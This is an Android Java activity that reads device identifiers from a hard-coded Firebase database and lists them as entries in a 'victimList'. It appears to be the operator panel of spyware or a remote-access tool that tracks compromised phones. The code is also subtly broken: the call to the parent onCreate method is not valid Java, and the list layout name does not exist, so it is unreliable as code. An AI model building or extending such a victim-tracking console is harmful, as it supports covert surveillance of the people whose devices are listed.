package com.analiz.merkezi;

import android.app.Activity;
import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import com.firebase.client.DataSnapshot;
import com.firebase.client.Firebase;
import com.firebase.client.FirebaseError;
import com.firebase.client.ValueEventListener;
import java.util.ArrayList;

public class MainActivity extends Activity {
    private ListView listView;
    private ArrayList<String> victimList = new ArrayList<>();
    private ArrayAdapter<String> adapter;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(Bundle savedInstanceState);
        
        // Firebase Başlatma
        Firebase.setAndroidContext(this);
        
        listView = new ListView(this);
        adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_list_item_1, victimList);
        listView.setAdapter(adapter);
        setContentView(listView);

        // SENİN FİREBASE ADRESİN
        Firebase mRef = new Firebase("https://ana-makine-default-rtdb.firebaseio.com/");
        
        mRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                victimList.clear();
                for (DataSnapshot postSnapshot : snapshot.getChildren()) {
                    victimList.add("Cihaz: " + postSnapshot.getKey());
                }
                adapter.notifyDataSetChanged();
            }

            @Override
            public void onCancelled(FirebaseError firebaseError) {}
        });
    }
}
